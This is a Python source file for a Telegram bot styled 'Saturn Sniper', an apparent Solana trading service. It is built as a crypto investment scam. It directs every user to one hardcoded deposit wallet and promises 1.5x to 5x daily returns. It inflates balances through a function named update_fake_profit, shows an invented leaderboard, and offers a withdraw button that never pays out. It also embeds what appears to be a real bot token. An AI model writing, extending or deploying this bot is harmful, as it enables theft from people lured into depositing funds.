# Requirements:
# pip install pyTelegramBotAPI

import telebot
from telebot import types
import json
import os
import datetime
import random

# ===== CONFIG =====
BOT_TOKEN = "8359973623:AAGNA4c2DmN0F--_dSxyWyJi8vjmu3k6fAI"  # REPLACE with a fresh token for production
DB_FILE = "saturn_db.json"

# This is the public "deposit" address shown in /start and /deposit
DEPOSIT_WALLET = "EXbk9r9P6W1UFAWAr9Mav6rLLqMWEEsVoLysKhBPsfG8"

bot = telebot.TeleBot(BOT_TOKEN)

# ===== SIMPLE JSON "DB" =====

def load_db():
    if not os.path.exists(DB_FILE):
        return {}
    try:
        with open(DB_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def save_db():
    try:
        with open(DB_FILE, "w") as f:
            json.dump(db, f, indent=2)
    except Exception as e:
        print("Error saving DB:", e)

db = load_db()

def now_utc_str():
    return datetime.datetime.utcnow().strftime("%Y-%m-%d • %I:%M %p UTC")

def get_user(user_id):
    uid = str(user_id)
    if uid not in db:
        db[uid] = {
            "created_at": now_utc_str(),
            "last_address_edit": "N/A",
            "withdraw_address": "",
            "address_locked": False,
            "balance": 0.0,
            "total_deposited": 0.0,
            "profit_total": 0.0,
            "sniper_running": False,
            "main_message_id": None,
            "info_message_id": None,
            "temp_prompt_msg_id": None
        }
        save_db()
    return db[uid]

def update_fake_profit(user):
    if user["sniper_running"] and user["balance"] > 0:
        gain = user["balance"] * random.uniform(0.002, 0.01)
        gain = round(gain, 4)
        user["balance"] += gain
        user["profit_total"] += gain
        save_db()

# ===== MARKUPS =====

def main_menu_markup():
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("🚀 Start Saturn Sniper", callback_data="sniper_start"),
        types.InlineKeyboardButton("❌ Stop Saturn Sniper", callback_data="sniper_stop"),
        types.InlineKeyboardButton("💸 Withdraw", callback_data="withdraw"),
        types.InlineKeyboardButton("💰 Check Balance", callback_data="balance"),
        types.InlineKeyboardButton("💼 Deposit", callback_data="deposit"),
        types.InlineKeyboardButton("📊 Stats", callback_data="stats"),
        types.InlineKeyboardButton("🏆 Leaderboard", callback_data="leaderboard"),
        types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
    )
    return m

def settings_markup(user):
    lock_text = "🔒 Lock Address" if not user["address_locked"] else "🔓 Unlock Address"
    m = types.InlineKeyboardMarkup(row_width=2)
    m.add(
        types.InlineKeyboardButton("✏️ Change Address", callback_data="change_address"),
        types.InlineKeyboardButton(lock_text, callback_data="toggle_lock"),
        types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
    )
    return m

def back_markup():
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("⬅️ Back", callback_data="back_main"))
    return m

# ===== MAIN TEXT =====

def build_main_text(user):
    return (
        "Your Wallet Has Been Successfully Created 🟢\n\n"
        "🪐 Your Solana Wallet Address (for deposits):\n"
        f"```{DEPOSIT_WALLET}```\n"
        f"Balance: {user['balance']:.1f} SOL 🔃\n\n"
        "💰 (This address is used by our algorithm hosting to generate money daily.)\n\n"
        "Profit Potential (per 24 hours):\n"
        "✅ 2 SOL Deposit: Earn up to 1.5x daily\n"
        "✅ 5 SOL Deposit: Earn up to 2.5x daily\n"
        "✅ 10 SOL Deposit: Earn up to 5x daily\n\n"
        "⭐ Average Trade Profit: ~0.2 - 2.5+ SOL\n\n"
        "⚠️ Note: A 3% fee applies to profits.\n\n"
        "Use the buttons below to manage Saturn Sniper.\n\n"
        "🟢"
    )

# ===== PANEL HELPERS =====

def send_or_update_main_message(chat_id, user):
    main_id = user["main_message_id"]
    txt = build_main_text(user)

    if main_id:
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=main_id,
                text=txt,
                reply_markup=main_menu_markup(),
                parse_mode="Markdown"
            )
            return
        except:
            pass

    msg = bot.send_message(
        chat_id, txt, reply_markup=main_menu_markup(), parse_mode="Markdown"
    )
    user["main_message_id"] = msg.message_id
    save_db()

def update_info_panel(chat_id, user, text, markup=None, markdown=True):
    info_id = user["info_message_id"]
    mode = "Markdown" if markdown else None

    try:
        if info_id:
            bot.edit_message_text(
                chat_id=chat_id, message_id=info_id,
                text=text, reply_markup=markup, parse_mode=mode
            )
            return
    except:
        pass

    msg = bot.send_message(
        chat_id, text, reply_markup=markup, parse_mode=mode
    )
    user["info_message_id"] = msg.message_id
    save_db()

# ===== START / HELP =====

@bot.message_handler(commands=["start"])
def cmd_start(message):
    user = get_user(message.from_user.id)
    update_fake_profit(user)

    send_or_update_main_message(message.chat.id, user)

    update_info_panel(
        message.chat.id, user,
        "📋 Use the buttons below the main message.\n\nChoose an option."
    )

@bot.message_handler(commands=["help"])
def cmd_help(message):
    user = get_user(message.from_user.id)
    update_fake_profit(user)

    update_info_panel(
        message.chat.id, user,
        "🛰 Saturn Auto Trade Help\n\nUse the menu buttons to navigate."
    )

# ===== CALLBACKS =====

@bot.callback_query_handler(func=lambda c: True)
def callback(call):
    user = get_user(call.from_user.id)
    chat_id = call.message.chat.id
    # --- WITHDRAW MENU ---
    if call.data == "withdraw":
        bot.answer_callback_query(call.id)
        update_fake_profit(user)

        addr = user["withdraw_address"]
        addr_text = f"```{addr}```" if addr else "❌ No withdrawal address set"

        balance = user["balance"]
        last_edit = user["last_address_edit"]
        locked = user["address_locked"]

        withdraw_text = (
            "🪐 Withdraw Solana\n\n"
            f"💰 Balance: {balance:.2f} SOL\n\n"
            "Current withdrawal address:\n"
            f"{addr_text}\n\n"
            f"🔧 Last updated: {last_edit}\n"
            f"{'🔒 Address is LOCKED' if locked else '🔓 Address is UNLOCKED'}\n\n"
            "Press the button below to withdraw funds:"
        )

        # Withdraw Funds button
        w = types.InlineKeyboardMarkup()
        w.add(types.InlineKeyboardButton("💸 Withdraw Funds", callback_data="withdraw_execute"))
        w.add(types.InlineKeyboardButton("⬅️ Back", callback_data="back_main"))

        update_info_panel(chat_id, user, withdraw_text, markup=w, markdown=True)
        return

    # --- EXECUTE WITHDRAW ---
    if call.data == "withdraw_execute":
        bot.answer_callback_query(call.id)

        balance = user["balance"]

        # MINIMUM REQUIRED — you can change this
        MIN_REQUIRED = 0.1

        if balance < MIN_REQUIRED:
            update_info_panel(
                chat_id, user,
                f"❌ You do not have enough funds to withdraw.\n\nMinimum required: {MIN_REQUIRED} SOL."
            )
        else:
            update_info_panel(
                chat_id, user,
                "⚙️ Processing your withdrawal...\n\n(This is a demo bot so no real withdrawal is made.)"
            )
        return

    # --- BALANCE ---
    if call.data == "balance":
        bot.answer_callback_query(call.id)
        update_fake_profit(user)

        balance = user["balance"]
        profit = user["profit_total"]
        sniper = "Running ✅" if user["sniper_running"] else "Stopped ⛔️"

        text = (
            "💰 Balance Information\n\n"
            f"💵 Balance: {balance:.2f} SOL\n"
            f"📈 Lifetime Profit: {profit:.2f} SOL\n"
            f"🚀 Sniper Status: {sniper}"
        )

        update_info_panel(chat_id, user, text)
        return

    # --- STATS ---
    if call.data == "stats":
        bot.answer_callback_query(call.id)
        update_fake_profit(user)

        bal = user["balance"]
        prof = user["profit_total"]
        dep = user["total_deposited"]
        created = user["created_at"]

        roi = (prof / dep * 100) if dep > 0 else 0

        text = (
            "📊 Account Statistics\n\n"
            f"💼 Total Deposited: {dep:.2f} SOL\n"
            f"💰 Current Balance: {bal:.2f} SOL\n"
            f"💹 Profit Total: {prof:.2f} SOL\n"
            f"📈 ROI: {roi:.2f}%\n\n"
            f"📅 Account Created: {created}"
        )

        update_info_panel(chat_id, user, text)
        return

    # --- LEADERBOARD ---
    if call.data == "leaderboard":
        bot.answer_callback_query(call.id)
        update_fake_profit(user)

        profit = user["profit_total"]

        text = (
            "🏆 Weekly Leaderboard\n\n"
            "🥇 @crypto_queen196 — +15.4 SOL\n"
            "🥈 @LoneNova — +12.8 SOL\n"
            "🥉 @Carmen_Jordan354 — +9.2 SOL\n\n"
            f"➡️ Your Profit: +{profit:.2f} SOL"
        )

        update_info_panel(chat_id, user, text)
        return

    # --- START SNIPER ---
    if call.data == "sniper_start":
        bot.answer_callback_query(call.id)

        if user["balance"] < 1:
            update_info_panel(
                chat_id, user,
                "❌ You need at least **1 SOL** to start the sniper."
            )
        else:
            user["sniper_running"] = True
            save_db()

            update_info_panel(
                chat_id, user,
                "🚀 Saturn Sniper Activated.\nScanning markets and executing trades automatically."
            )
        return

    # --- STOP SNIPER ---
    if call.data == "sniper_stop":
        bot.answer_callback_query(call.id)
        user["sniper_running"] = False
        save_db()

        update_info_panel(
            chat_id, user,
            "⛔️ Saturn Sniper has been stopped."
        )
        return

    # --- DEPOSIT ---
    if call.data == "deposit":
        bot.answer_callback_query(call.id)

        text = (
            "💼 Deposit SOL\n\n"
            "Send SOL to this address:\n"
            f"```{DEPOSIT_WALLET}```\n\n"
            "⚠️ Deposits may take up to 10 minutes to appear."
        )

        update_info_panel(chat_id, user, text, markup=back_markup(), markdown=True)
        return

    # --- SETTINGS ---
    if call.data == "settings":
        bot.answer_callback_query(call.id)

        addr = user["withdraw_address"]
        addr_text = f"```{addr}```" if addr else "❌ No withdrawal address set"
        lock_text = "Locked 🔒" if user["address_locked"] else "Unlocked 🔓"

        text = (
            "⚙️ Settings\n\n"
            "Current withdrawal address:\n"
            f"{addr_text}\n\n"
            f"🔐 Address Lock Status: {lock_text}"
        )

        update_info_panel(chat_id, user, text, markup=settings_markup(user), markdown=True)
        return

    # --- TOGGLE LOCK ---
    if call.data == "toggle_lock":
        bot.answer_callback_query(call.id)

        user["address_locked"] = not user["address_locked"]
        save_db()

        lock_text = "Locked 🔒" if user["address_locked"] else "Unlocked 🔓"
        addr = user["withdraw_address"]
        addr_text = f"```{addr}```" if addr else "❌ No withdrawal address set"

        update_info_panel(
            chat_id, user,
            f"⚙️ Settings Updated\n\nCurrent withdrawal address:\n{addr_text}\n\n🔐 Address is now {lock_text}",
            markup=settings_markup(user),
            markdown=True
        )
        return

    # --- CHANGE ADDRESS (PROMPT) ---
    if call.data == "change_address":
        bot.answer_callback_query(call.id)

        if user["address_locked"]:
            update_info_panel(
                chat_id, user,
                "❌ Address is locked. Unlock it first."
            )
            return

        update_info_panel(
            chat_id, user,
            "✏️ Send the new Solana withdrawal address:"
        )

        # temp message required for next_step_handler
        temp_msg = bot.send_message(chat_id, "🔹 Reply with address:")
        user["temp_prompt_msg_id"] = temp_msg.message_id
        save_db()

        bot.register_next_step_handler(temp_msg, lambda m: handle_new_address(m, call.from_user.id))
        return

    # --- BACK ---
    if call.data == "back_main":
        bot.answer_callback_query(call.id)

        update_info_panel(
            chat_id, user,
            "⬅️ Back to main menu.\nChoose an option."
        )
        return

# ===== ADDRESS INPUT =====

def handle_new_address(message, user_id):
    user = get_user(user_id)

    # Remove the temp message
    temp = user.get("temp_prompt_msg_id")
    if temp:
        try:
            bot.delete_message(message.chat.id, temp)
        except:
            pass
        user["temp_prompt_msg_id"] = None
        save_db()

    new = message.text.strip()

    # Validate length only (simple)
    if len(new) < 30 or len(new) > 60:
        update_info_panel(
            message.chat.id, user,
            "❌ Invalid Solana address."
        )
        return

    # Confirm panel
    confirm_msg = (
        f"📝 New Address:\n```{new}```\n\n"
        "Save this address?"
    )

    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_addr:{new}"))
    m.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_addr"))

    update_info_panel(message.chat.id, user, confirm_msg, markup=m, markdown=True)

# ===== CONFIRM / CANCEL =====

@bot.callback_query_handler(func=lambda c: c.data.startswith("confirm_addr:") or c.data == "cancel_addr")
def address_confirm(call):
    user = get_user(call.from_user.id)
    chat_id = call.message.chat.id

    if call.data.startswith("confirm_addr:"):
        new_addr = call.data.split("confirm_addr:")[1]

        if user["address_locked"]:
            update_info_panel(chat_id, user, "❌ Address is locked.")
            return

        user["withdraw_address"] = new_addr
        user["last_address_edit"] = now_utc_str()
        save_db()

        update_info_panel(
            chat_id, user,
            f"✅ Address Updated:\n```{new_addr}```",
            markdown=True
        )
        return

    if call.data == "cancel_addr":
        update_info_panel(chat_id, user, "❌ Address update cancelled.")
        return

# ===== START BOT =====

if __name__ == "__main__":
    bot.polling(none_stop=True)
